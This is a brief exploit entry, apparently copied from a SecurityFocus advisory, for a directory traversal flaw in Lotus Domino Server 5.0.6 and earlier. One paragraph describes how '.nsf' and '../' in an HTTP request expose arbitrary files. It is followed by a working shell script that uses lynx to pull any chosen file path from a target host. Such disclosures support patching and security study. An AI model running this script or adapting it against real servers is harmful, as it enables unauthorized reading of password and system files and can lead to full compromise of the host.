source: http://www.securityfocus.com/bid/2173/info
 
It is possible for a remote user to gain access to any known file residing on the Lotus Domino Server 5.0.6 and previous. A specially crafted HTTP request comprised of '.nsf' and '../' along with the known filename, will display the contents of the particular file with read permissions.
 
Successful exploitation of this vulnerability could enable a remote user to gain access to systems files, password files, etc. This could lead to a complete compromise of the host.

#!/bin/sh

HOST=$1
PATH=$2

start()
{
	/usr/bin/lynx -dump http://$HOST/.nsf/../$PATH
}


if [ -n "$HOST" ]; then 
        start
else
        echo "$0 <host> <path>"
fi